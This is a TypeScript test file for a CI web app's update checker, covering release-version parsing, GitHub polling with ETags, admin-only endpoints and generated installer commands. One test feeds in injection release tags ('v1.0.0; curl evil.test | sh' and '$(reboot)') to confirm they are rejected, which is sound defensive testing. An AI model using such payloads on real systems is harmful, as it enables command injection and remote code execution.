import { describe, expect, it } from "vitest";
import { addUser, signIn } from "./auth/helpers.ts";
import { testApp, TEST_ORIGIN } from "./harness.ts";
import { ensureMigrated } from "../src/db/migrate.ts";
import { BudgetExhausted } from "../src/jobs/budget.ts";
import { runJobs } from "../src/jobs/runner.ts";
import { HOUSEKEEPING_JOBS } from "../src/jobs.ts";
import { compareVersions, pickLatest, UPDATE_CHECK_JOB } from "../src/updates/updates.ts";

const HOUR = 3_600_000;
const release = (tag: string, extra: object = {}) => ({ tag_name: tag, draft: false, prerelease: false, ...extra });

type Handler = (url: string, init?: RequestInit) => Response | Promise<Response>;

function stub(handler: Handler) {
  const calls: { url: string; headers: Headers }[] = [];
  const f = (async (input: RequestInfo | URL, init?: RequestInit) => {
    calls.push({ url: String(input), headers: new Headers(init?.headers) });
    return handler(String(input), init);
  }) as typeof fetch;
  return { f, calls };
}

const fromGithub = (web: string, rt: string): Handler => (url) =>
  Response.json([release(url.includes("runtime-web") ? web : rt)], { headers: { etag: '"abc"' } });

async function setup(handler: Handler, version = "0.1.0") {
  const { f, calls } = stub(handler);
  const app = testApp({ fetch: f, version });
  await ensureMigrated(app.deps.storage.db);
  await addUser(app, "root@x.test", { admin: true });
  await addUser(app, "plain@x.test");
  const tick = () => runJobs(app.deps, [UPDATE_CHECK_JOB]);
  return { app, calls, tick, admin: await signIn(app, "root@x.test"), plain: await signIn(app, "plain@x.test") };
}

describe("version helpers", () => {
  it("compares numerically and ranks a prerelease below its release", () => {
    expect(compareVersions("0.10.0", "0.9.9")).toBeGreaterThan(0);
    expect(compareVersions("v1.2.3", "1.2.3")).toBe(0);
    expect(compareVersions("1.2.3-rc.1", "1.2.3")).toBeLessThan(0);
    expect(compareVersions("dev", "1.2.3")).toBeNull();
  });

  it("picks the highest stable tag, whatever order GitHub lists them in", () => {
    expect(
      pickLatest([
        release("v0.2.1"),
        release("v0.3.0"),
        release("v0.4.0", { prerelease: true }),
        release("v0.5.0", { draft: true }),
        release("v0.6.0-rc.1"),
      ])?.version,
    ).toBe("0.3.0");
  });

  it("drops a tag that is not plain semver, because the version ends up in shell commands", () => {
    expect(pickLatest([release("v1.0.0; curl evil.test | sh"), release("$(reboot)")])).toBeNull();
  });
});

describe("update check job", () => {
  it("is a housekeeping job that runs at most every six hours", () => {
    expect(HOUSEKEEPING_JOBS).toContain(UPDATE_CHECK_JOB);
    expect(UPDATE_CHECK_JOB.everyMs).toBe(6 * HOUR);
  });

  it("asks both repositories, without a token", async () => {
    const { tick, calls } = await setup(fromGithub("0.2.0", "0.9.0"));
    await tick();
    expect(calls.map((c) => c.url).sort()).toEqual([
      "https://api.github.com/repos/21-ci/runtime-web/releases?per_page=20",
      "https://api.github.com/repos/21-ci/runtime/releases?per_page=20",
    ]);
    expect(calls.every((c) => !c.headers.has("authorization"))).toBe(true);
  });

  it("does not ask again within six hours, even when the job state is reset", async () => {
    const { app, tick, calls } = await setup(fromGithub("0.2.0", "0.9.0"));
    await tick();
    await app.deps.storage.db.run("DELETE FROM job_state");
    app.tick(HOUR);
    await tick();
    expect(calls).toHaveLength(2);
  });

  it("sends the ETag back and keeps the known version on 304", async () => {
    let etagged = false;
    const { app, tick, calls, admin } = await setup((url) =>
      etagged ? new Response(null, { status: 304 }) : fromGithub("0.2.0", "0.9.0")(url),
    );
    await tick();
    etagged = true;
    app.tick(6 * HOUR + 1);
    await tick();
    expect(calls[2]?.headers.get("if-none-match")).toBe('"abc"');
    const body = (await (await admin.call("GET", "/api/admin/updates")).json()) as { items: { latest: string }[] };
    expect(body.items.map((i) => i.latest).sort()).toEqual(["0.2.0", "0.9.0"]);
  });

  it("survives rate limits, network errors and junk, keeping what it knew", async () => {
    let mode: "ok" | "limit" | "down" | "junk" = "ok";
    const { app, tick, admin } = await setup((url) => {
      if (mode === "limit") return new Response("{}", { status: 403 });
      if (mode === "down") throw new TypeError("network");
      if (mode === "junk") return new Response("<html>");
      return fromGithub("0.2.0", "0.9.0")(url);
    });
    await tick();
    for (const m of ["limit", "down", "junk"] as const) {
      mode = m;
      app.tick(6 * HOUR + 1);
      await tick();
      const row = await app.deps.storage.db.first<{ failures: number }>("SELECT failures FROM job_state WHERE name = ?", [UPDATE_CHECK_JOB.name]);
      expect(row?.failures).toBe(0);
      const body = (await (await admin.call("GET", "/api/admin/updates")).json()) as { items: { latest: string; check_failed: boolean }[] };
      expect(body.items.every((i) => i.check_failed)).toBe(true);
      expect(body.items.map((i) => i.latest).sort()).toEqual(["0.2.0", "0.9.0"]);
    }
  });

  it("lets a budget stop reach the runner", async () => {
    const { tick, app } = await setup(() => {
      throw new BudgetExhausted();
    });
    await tick();
    const row = await app.deps.storage.db.first<{ last_error: string }>("SELECT last_error FROM job_state WHERE name = ?", [UPDATE_CHECK_JOB.name]);
    expect(row?.last_error).toBe("budget_exhausted");
  });

  it("makes no request while disabled", async () => {
    const { tick, calls, admin } = await setup(fromGithub("0.2.0", "0.9.0"));
    expect((await admin.call("PUT", "/api/admin/updates", { enabled: false })).status).toBe(200);
    await tick();
    expect(calls).toHaveLength(0);
  });
});

describe("/api/admin/updates", () => {
  it("is instance-admin only", async () => {
    const { plain } = await setup(fromGithub("0.2.0", "0.9.0"));
    expect((await plain.call("GET", "/api/admin/updates")).status).toBe(403);
    expect((await plain.call("PUT", "/api/admin/updates", { enabled: false })).status).toBe(403);
  });

  it("never offers an installer from a moving ref: no pinned tag, no command", async () => {
    const onlyRuntime: Handler = (url) =>
      url.includes("runtime-web") ? new Response("nope", { status: 500 }) : Response.json([release("v9.0.0")]);
    const { tick, admin } = await setup(onlyRuntime);
    await tick();
    const raw = await (await admin.call("GET", "/api/admin/updates")).text();
    expect(raw).not.toContain("/main/");
    const body = JSON.parse(raw) as { items: { component: string; commands: unknown }[] };
    expect(body.items.find((i) => i.component === "runtime")?.commands).toBeNull();
  });

  it("does not read a releases body past the cap", async () => {
    let pulled = 0;
    const endless = new ReadableStream<Uint8Array>({
      pull(c) {
        pulled += 1;
        if (pulled > 200) return c.close();
        c.enqueue(new Uint8Array(100_000).fill(32));
      },
    });
    const { tick, admin } = await setup(() => new Response(endless));
    await tick();
    expect(pulled).toBeLessThan(60);
    const body = (await (await admin.call("GET", "/api/admin/updates")).json()) as { items: { check_failed: boolean }[] };
    expect(body.items.some((i) => i.check_failed)).toBe(true);
  });

  it("marks what is outdated, links the notes and gives the commands", async () => {
    const { tick, admin } = await setup(fromGithub("0.2.0", "0.0.1"));
    await tick();
    const body = (await (await admin.call("GET", "/api/admin/updates")).json()) as {
      enabled: boolean;
      items: { component: string; outdated: boolean; current: string; notes_url: string; commands: { bare: string; docker: string | null } }[];
    };
    expect(body.enabled).toBe(true);
    const web = body.items.find((i) => i.component === "runtime_web");
    expect(web).toMatchObject({ outdated: true, current: "0.1.0", notes_url: "https://github.com/21-ci/runtime-web/releases/tag/0.2.0" });
    expect(web?.commands.bare).toContain("--version 0.2.0");
    expect(web?.commands.bare).toContain(`--domain ${new URL(TEST_ORIGIN).hostname}`);
    expect(web?.commands.docker).toContain("--mode docker");

    // The runtime is not replaced by the installer, and the image bundles it.
    const rt = body.items.find((i) => i.component === "runtime");
    expect(rt?.outdated).toBe(false);
    expect(rt?.commands.docker).toBeNull();
    expect(rt?.commands.bare).toContain("sudo sh install.sh --upgrade-runtime --runtime-version 0.0.1");
    expect(rt?.commands.bare).toContain("/21-ci/runtime-web/0.2.0/install.sh");
  });

  it("never calls a dev build outdated", async () => {
    const { tick, admin } = await setup(fromGithub("0.2.0", "0.0.1"), "dev");
    await tick();
    const body = (await (await admin.call("GET", "/api/admin/updates")).json()) as { items: { component: string; outdated: boolean }[] };
    expect(body.items.find((i) => i.component === "runtime_web")?.outdated).toBe(false);
  });

  it("says why a check failed and checks again on request, once a minute at most", async () => {
    let status = 403;
    const { app, calls, tick, admin, plain } = await setup(() => (status === 200 ? Response.json([release("v0.2.0")]) : new Response("nope", { status })));
    await tick();
    const failed = (await (await admin.call("GET", "/api/admin/updates")).json()) as { items: { check_error: string | null }[] };
    expect(failed.items.every((i) => i.check_error === "http_403")).toBe(true);

    expect((await plain.call("POST", "/api/admin/updates/check")).status).toBe(403);
    const before = calls.length;
    status = 200;
    await admin.call("POST", "/api/admin/updates/check");
    expect(calls.length).toBe(before); // Same clock: still inside the minute.

    const now = app.deps.now();
    app.deps.now = () => now + 61_000;
    const res = await admin.call("POST", "/api/admin/updates/check");
    const body = (await res.json()) as { items: { check_failed: boolean; check_error: string | null; latest: string }[] };
    expect(calls.length).toBe(before + 2);
    expect(body.items.every((i) => !i.check_failed && i.check_error === null && i.latest === "0.2.0")).toBe(true);
  });

  it("hides updates once disabled, validates the toggle and audits it", async () => {
    const { app, tick, admin } = await setup(fromGithub("0.2.0", "0.0.1"));
    await tick();
    expect((await admin.call("PUT", "/api/admin/updates", { enabled: "no" })).status).toBe(422);
    const res = await admin.call("PUT", "/api/admin/updates", { enabled: false });
    const body = (await res.json()) as { enabled: boolean; items: { outdated: boolean }[] };
    expect(body.enabled).toBe(false);
    expect(body.items.some((i) => i.outdated)).toBe(false);
    const row = await app.deps.storage.db.first<{ c: number }>("SELECT count(*) AS c FROM audit WHERE action = 'updates.configure'");
    expect(row?.c).toBe(1);
  });
});
